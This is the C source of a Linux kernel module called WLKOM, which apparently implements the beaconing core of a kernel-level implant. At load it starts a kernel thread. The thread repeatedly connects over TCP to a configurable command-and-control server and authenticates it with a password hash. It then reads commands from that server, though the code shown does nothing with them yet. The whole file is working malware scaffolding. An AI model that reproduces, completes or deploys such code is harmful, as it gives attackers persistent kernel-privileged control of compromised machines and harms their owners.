#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <net/sock.h>

#define RETRY_DELAY 5
#define AUTH_PREFIX "AUTH "
#define AUTH_PREFIX_LEN (sizeof(AUTH_PREFIX) - 1)

static char *password_hash = "";
static char *c2_ip    = "192.168.100.10";
static int   c2_port  = 4444;
module_param(password_hash, charp, 0400);
module_param(c2_ip,    charp, 0400);
module_param(c2_port,  int,   0400);
MODULE_PARM_DESC(password_hash, "FNV-1a password hash (required at insmod)");
MODULE_PARM_DESC(c2_ip,    "C2 server IPv4 address");
MODULE_PARM_DESC(c2_port,  "C2 server TCP port");

static struct task_struct *conn_thread = NULL;
static struct socket      *conn_sock   = NULL;

/* avoids -Wincompatible-pointer-types with struct sockaddr_unsized on 6.x */
static void *to_sockaddr(void *ptr) { return ptr; }

static int recv_line(char *buf, size_t size)
{
    size_t pos = 0;
    int ret;

    if (size == 0)
        return -EINVAL;

    while (pos + 1 < size && !kthread_should_stop()) {
        struct msghdr msg = { 0 };
        struct kvec vec = {
            .iov_base = &buf[pos],
            .iov_len = 1,
        };

        ret = kernel_recvmsg(conn_sock, &msg, &vec, 1, 1, 0);
        if (ret <= 0)
            return ret;

        if (buf[pos] == '\n') {
            buf[pos] = '\0';
            if (pos > 0 && buf[pos - 1] == '\r')
                buf[pos - 1] = '\0';
            return pos;
        }

        pos++;
    }

    buf[pos] = '\0';
    return -EMSGSIZE;
}

static int authenticate_c2(void)
{
    char buf[256];
    char *received_hash;
    int ret;

    memset(buf, 0, sizeof(buf));
    ret = recv_line(buf, sizeof(buf));
    if (ret <= 0)
        return ret ? ret : -ECONNRESET;

    if (strncmp(buf, AUTH_PREFIX, AUTH_PREFIX_LEN) != 0)
        return -EACCES;

    received_hash = buf + AUTH_PREFIX_LEN;
    if (strcmp(received_hash, password_hash) != 0)
        return -EACCES;

    return 0;
}

static int do_connect(void)
{
    struct sockaddr_in addr = { 0 };
    unsigned char ip_bin[4] = { 0 };
    int ret;

    if (in4_pton(c2_ip, -1, ip_bin, -1, NULL) == 0) {
        pr_err("wlkom: invalid C2 IP address: %s\n", c2_ip);
        return -EINVAL;
    }

    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_sock);
    if (ret < 0) {
        pr_err("wlkom: sock_create failed: %d\n", ret);
        return ret;
    }

    addr.sin_family = AF_INET;
    addr.sin_port   = htons(c2_port);
    memcpy(&addr.sin_addr.s_addr, ip_bin, sizeof(addr.sin_addr.s_addr));

    ret = conn_sock->ops->connect(conn_sock, to_sockaddr(&addr),
                                  sizeof(addr), 0);
    if (ret < 0) {
        sock_release(conn_sock);
        conn_sock = NULL;
        return ret;
    }

    return 0;
}

static int connection_thread(void *data)
{
    struct msghdr msg = { 0 };
    struct kvec   vec = { 0 };
    char buf[256];
    int  ret;

    while (!kthread_should_stop()) {
        ret = do_connect();
        if (ret < 0) {
            pr_err("wlkom: C2 unreachable (%d), retry in %ds\n",
                   ret, RETRY_DELAY);
            schedule_timeout_interruptible(HZ * RETRY_DELAY);
            continue;
        }

        pr_info("wlkom: connected to C2 %s:%d\n", c2_ip, c2_port);

        ret = authenticate_c2();
        if (ret < 0) {
            pr_warn("wlkom: C2 authentication failed (%d)\n", ret);
            goto disconnect;
        }

        pr_info("wlkom: C2 authenticated\n");

        while (!kthread_should_stop()) {
            memset(buf, 0, sizeof(buf));
            vec.iov_base = buf;
            vec.iov_len  = sizeof(buf) - 1;
            ret = kernel_recvmsg(conn_sock, &msg, &vec, 1, vec.iov_len, 0);
            if (ret == 0 || ret < 0)
                break;
        }

disconnect:
        kernel_sock_shutdown(conn_sock, SHUT_RDWR);
        sock_release(conn_sock);
        conn_sock = NULL;
        pr_info("wlkom: disconnected from C2, retrying\n");
    }

    return 0;
}

static int __init wlkom_init(void)
{
    if (!password_hash || password_hash[0] == '\0') {
        pr_err("wlkom: password_hash required (insmod wlkom.ko password_hash=...)\n");
        return -EINVAL;
    }

    pr_info("wlkom: loaded\n");

    conn_thread = kthread_run(connection_thread, NULL, "wlkom_conn");
    if (IS_ERR(conn_thread)) {
        pr_err("wlkom: failed to create connection thread\n");
        conn_thread = NULL;
        return -ENOMEM;
    }

    return 0;
}

static void __exit wlkom_exit(void)
{
    /* shutdown unblocks kernel_recvmsg before kthread_stop waits */
    if (conn_sock)
        kernel_sock_shutdown(conn_sock, SHUT_RDWR);

    if (conn_thread)
        kthread_stop(conn_thread);

    if (conn_sock) {
        sock_release(conn_sock);
        conn_sock = NULL;
    }

    pr_info("wlkom: unloaded\n");
}

module_init(wlkom_init);
module_exit(wlkom_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("WLKOM - Wild Linux Kernel Object Module");
MODULE_AUTHOR("NMT");
